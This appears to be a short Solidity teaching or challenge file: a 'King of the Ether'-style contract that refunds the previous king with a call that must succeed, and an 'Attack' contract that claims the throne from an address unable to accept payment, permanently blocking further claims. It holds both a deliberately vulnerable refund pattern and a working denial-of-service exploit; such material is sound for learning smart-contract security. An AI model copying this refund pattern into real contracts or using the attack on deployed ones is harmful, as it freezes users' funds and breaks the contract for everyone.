// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract King {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Pay more");
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed");
        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack{
    function attack(King raja) public payable {
        raja.claimThrone{value:msg.value}();
    }
}
